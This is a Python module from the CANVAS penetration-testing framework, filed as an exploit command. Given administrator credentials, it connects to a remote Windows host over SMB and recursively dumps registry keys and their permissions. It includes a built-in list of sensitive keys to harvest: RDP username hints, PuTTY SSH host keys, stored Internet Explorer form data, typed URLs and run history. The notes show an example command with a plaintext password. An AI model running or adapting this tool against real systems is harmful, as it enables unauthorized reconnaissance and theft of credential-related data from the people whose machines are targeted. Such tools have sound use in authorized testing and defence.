#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  reg_dump.py
## Description:
##            :
## Created_On :  Tue Oct 27 CET 2015
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import sys
import socket
import os
import random
import logging

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'RegDump - Remote Registry dump'
DESCRIPTION                     = 'Dumps a specific key and related subkeys'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = ''

VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Commands'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['NT', '2000', 'XP', 'Vista', '7', '2003', '2008', '2012']

CHANGELOG = """
"""

DOCUMENTATION['NOTES']          = """
This is only the first implementation, an improved one will follow in our next
releases.

Tested against:
    - Windows Server 2003 R2 (x86)
    - Windows Server 2008 R2 (amd64)
    - Windows Server 2012 R2 (amd64)
    - Windows 7 Ultimate N (x86)

Note:
    On Windows workstations, the registry service might not be running by 
    default. As such, the module cannot work as such. To solve this issue if it
    ever happens, the psexec module can be used to start (and then stop) the 
    service.

To run the module from command line:
python exploits/command/windows/reg_dump/reg_dump.py -t 192.168.0.1
    -Ouser:administrator
    -Opassword:barbar123!
    -Oroot_key:HKEY_CLASSES_ROOT
    -Osub_key:'Software\Microsoft'
    -Omax_level:5
"""

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from engine import CanvasConfig
from engine.config import canvas_root_directory
from libs.canvasos import *
import libs.kerberos.ccache as cc
import libs.newsmb.winreg as wreg
from libs.newsmb.winreg import build_permission_string

root_keys = {'HKCR':'HKEY_CLASSES_ROOT',
             'HKLM':'HKEY_LOCAL_MACHINE',
             'HKCU':'HKEY_CURRENT_USER',
             'HKU' :'HKEY_USERS',
             'HKPD':'HKEY_PERFORMANCE_DATA',
             'HKCC':'HKEY_CURRENT_CONFIG'
             }

interesting_keys = [
    'HKCU\Software\Microsoft\Terminal Server Client\Servers\SERVERNAME\UsernameHint',
    'HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers\SERVERNAME\UsernameHint',
    'HKEY_USERS\SID\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU',
    'HKEY_USERS\SID\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2',
    'HKEY_USERS\SID\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths',
    'HKEY_USERS\SID\Software\SimonTatham\PuTTY\SshHostKeys',
    'HKCU\Software\Microsoft\Office\Common\UserInfo',
    'HKCU\Software\Microsoft\Internet Explorer\TypedU,RLs',
    'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU',
    'HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\History',
    'HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL',
    'HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage1 and Storage2',
    'HKCU\Software\VMWare\Virtual Infrastructure Client\Preference\UI\ClientsXml'
]

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.result       = ""
        self.name         = NAME
        self.user         = u""
        self.password     = u""
        self.domain       = u""
        self.reg_key      = 'HKCR\\'
        sub_key      = '\\'
        self.max_level    = 1
        self.dump_aces    = True
        self.port         = 445
        self.version      = 0
        self.interesting_keys = False
        
        #self.ccache_file  = None

    def getargs(self):
        self.user = self.argsDict.get("user",self.user)
        self.password = self.argsDict.get("password",self.password)
        self.domain = self.argsDict.get('domain', self.domain)
        self.reg_key = self.argsDict.get('root_key', self.reg_key)
        self.max_level = int(self.argsDict.get('max_level', self.max_level))
        self.dump_aces = bool(self.argsDict.get('dump_aces', self.dump_aces))
        self.version = self.argsDict.get('version', self.version)
        self.use_interesting_keys = self.argsDict.get('interesting_keys', self.interesting_keys)
        
    def dump_values(self, hkey, key_name, with_perms_audit=True):
        """
        Provide a dirlist like ability.
        """

        try:

            # Internal recursive routine.
            def dump(current_key, current_keyname, current_level, logs):

                # We may need to break out of the loop at some point
                if current_level >= self.max_level:
                    return

                access=None
                if with_perms_audit:
                     access  = wreg.READ_CONTROL
                     access |= wreg.KEY_QUERY_VALUE
                     access |= wreg.KEY_NOTIFY
                     access |= wreg.KEY_ENUMERATE_SUB_KEYS
                     access |= wreg.ACCESS_SYSTEM_SECURITY

                key = self.winreg.open_subkey(current_key, keyname=current_keyname, access=access)
                informations = self.winreg.query_information(handle=key)
                # For each entry, we attempt to dir list subentries
                keynames = []
                for i in xrange(informations['nbr_keys']):
                    keynames += [ self.winreg.enum_key(key, i)['name'] ]

                # For each entry, we attempt to dir list subentries
                for i in xrange(informations['nbr_keys']):

                    # We compute the absolute Key path
                    if current_keyname == '':
                        nextkeyname = "%s" % keynames[i]
                    else:
                        nextkeyname = "%s\%s" % (current_keyname, keynames[i])

                    # Then, if required, we need to find the authentication associated
                    perms = ''
                    access=None
                    if with_perms_audit:
                        access  = wreg.READ_CONTROL
                        access |= wreg.KEY_QUERY_VALUE
                        access |= wreg.KEY_NOTIFY
                        access |= wreg.KEY_ENUMERATE_SUB_KEYS
                        access |= wreg.ACCESS_SYSTEM_SECURITY
                        tmpkey = self.winreg.open_subkey(current_key, keyname=nextkeyname, access=access)
                        perms_authenticated_users = ''
                        perms_everyone = ''
                        res = self.winreg.get_key_security(handle=tmpkey)
                        if res['Dacl']:
                            for ace in res['Dacl']:
                                ace_res = ace.get_results()
                                # Authenticated Users
                                if ace_res['sid'] == 'S-1-5-11':
                                    perms_authenticated_users = wreg.build_permission_string(ace_res['mask'])
                                # Everyone
                                elif ace_res['sid'] == 'S-1-1-0':
                                    perms_everyone = wreg.build_permission_string(ace_res['mask'])
                        if not perms_authenticated_users:
                            perms_authenticated_users = ''
                        if not perms_everyone:
                            perms_everyone = ''
                        self.winreg.close_key(tmpkey)

                        if perms_authenticated_users:
                            perms += 'Authenticated Users: %s ' % perms_authenticated_users
                        if perms_everyone:
                            perms += 'EveryOne: %s' % perms_everyone
                        if perms:
                            perms = '[ ' + perms + ' ]'

                    logs.append("  "*(current_level+1) + "[DIR] %s %s" % (keynames[i], perms))
                    dump(current_key, nextkeyname, current_level+1, logs)

                # At the end of the dir list, we enumerate values
                for i in xrange(informations['nbr_values']):
                    try:
                        val_obj = self.winreg.enum_value(key,
                                                 i,
                                                 valnamelen=informations['max_value_namelen'],
                                                 valbufsize=informations['max_value_len'])

                        logs.append("  "*(current_level+1) + "      %s (%s): %s" % (val_obj['name'],
                                                                                wreg.convert_type_to_string(val_obj['type']),
                                                                                wreg.convert_value_to_string(val_obj['type'], val_obj['value'])))
                    except Exception as e:
                        if e.status == wreg.ERROR_NO_MORE_ITEMS:
                            break

                self.winreg.close_key(key)
                return

            logging.info('Beginning extraction (make take some time)')
            logs = []
            dump(hkey, key_name, 0, logs)
            self.winreg.close_key(hkey)
            logging.info('Extraction complete!')
            return logs

        except wreg.WINREGBaseRegOpenKeyException as e:
            if e.status == wreg.ERROR_ACCESS_DENIED:
                logging.error("Cannot open key \'%s\\%s\' with current credentials: access denied" % (root_key, key_name))
                return logs
        except Exception as e:
            logging.error('%s', str(e))
            return logs

    def is_alive_with_smb(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target.interface,self.port))
            s.close()
            return True
        except Exception as e:
            return False

    def testOS(self, target_ip):
        isWindows = True

        logging.info('Attempting to fingerprint %s' % target_ip)
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        app.target.interface = target_ip
        app.argsDict["smb"]                 = True
        app.argsDict["http"]                = False # not needed
        app.argsDict["ssh"]                 = False # not needed
        app.argsDict["mdns"]                = False # not needed
        app.argsDict["ntp"]                 = False # not needed
        app.argsDict["ftp"]                 = False # not needed
        app.argsDict["smtp"]                = False # not needed
        app.argsDict["dtspcd"]              = False # not needed
        app.argsDict["ipfi"]                = False # not needed
        app.argsDict["telnet"]              = False # not needed
        app.argsDict["nolanguagedetect"]    = True  # not needed
        if app.run() == 0:
            logging.info('Automatic detection failed')
            return None
        myos = app.result
        # Detection of the OS is straightforward
        if myos.base != 'Windows':
            logging.info("A non-Windows host has been detected")
            isWindows = False
        return isWindows

    def run(self):
        self.setInfo("%s" % NAME)
        self.getargs()
        self.result = []
        node = self.argsDict["passednodes"][0]

        if node.islocal(self.target.interface):
            logging.error("Local execution is not supported yet")
            return 0

        # First of all, let's check that the target is alive. Since we will be
        # using tcp/445 for service upload/creation, a tcp connect is fair check.
        # Note: However we should also in another version consider the case of SMB over UDP.
        if not self.is_alive_with_smb():
            logging.info("Target doesn't have SMB exposed. Bailing")
            return 0

        # If automatic was selected, we need to know if the remote host is windows
        # We may also need to run the test nonetheless if we need the architecture
        # Note: Obviously we could also own unix target integrated in the AD but
        # we won't support this case.
        if self.version == 0:
            logging.info("Fingerprinting our target")
            self.isWindows = self.testOS(self.target.interface)
            if self.isWindows is None:
                logging.error("OS detection failed. You may rerun the exploit forcing Windows")
                return 0
            else:
                if self.isWindows == False:
                    logging.error('Not a Windows target. Aborting')
                    return 0

        # Then we bind() to the register named pipe        
        self.winreg = wreg.WINREGClient(self.target.interface)
        self.winreg.set_credentials(self.user, self.password, self.domain)
        if not self.winreg.bind():
            logging.error("Authentication failed or registry service is not running.")
            return 0
        
        extra_keys = []
        if self.use_interesting_keys:
            extra_keys = interesting_keys
        for reg_key in self.reg_key.splitlines() + extra_keys:
            reg_key = reg_key.upper()
        
            root_key, sub_key = reg_key.split('\\', 1)
           
            # Did we provide a valid root_key?
            if root_key not in root_keys.values() + root_keys.keys():
                logging.error("The key \'%s\' is either invalid or unhandled." % root_key)                
                continue
            elif root_key in root_keys.keys():                
                root_key = root_keys[root_key]
                
            logging.info('Processing %s' % reg_key)
            
            # At this point we need to open the root key if we can
            root_opener = {
                'HKEY_CLASSES_ROOT'     : self.winreg.open_classes_root,
                'HKEY_LOCAL_MACHINE'    : self.winreg.open_local_machine,
                'HKEY_CURRENT_USER'     : self.winreg.open_current_user,
                'HKEY_USERS'            : self.winreg.open_users,
                'HKEY_PERFORMANCE_DATA' : self.winreg.open_performance_data,
                'HKEY_CURRENT_CONFIG'   : self.winreg.open_current_config
            }
            
            try:
                hkey = root_opener[root_key]()
            except Exception as e:
                logging.error('Failed to open the key \'%s\' with current credentials' % root_key)
                continue
            
            # Now let's filter/modify the subkey
            # If nothing is provided, we need a minimum
            if sub_key == '':
                logging.info('Assuming \ subkey.')
            else:
                # We also need to sanitize the subkey parameter
                sub_key = sub_key.replace('/', '\\')
                sub_key = sub_key.lstrip('\\')
                sub_key = sub_key.rstrip('\\')
    
            # Now we can safely proceed to the extraction!
            logs = self.dump_values(hkey, sub_key, with_perms_audit=self.dump_aces)
            if not logs:
                logging.info('This key is empty')
                continue
            else:
                logging.info('Dumping %s\%s' % (root_key,sub_key))
                for log in logs:
                    logging.info(log)

        self.setInfo("%s - done (success)" % (NAME))
        return 1

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
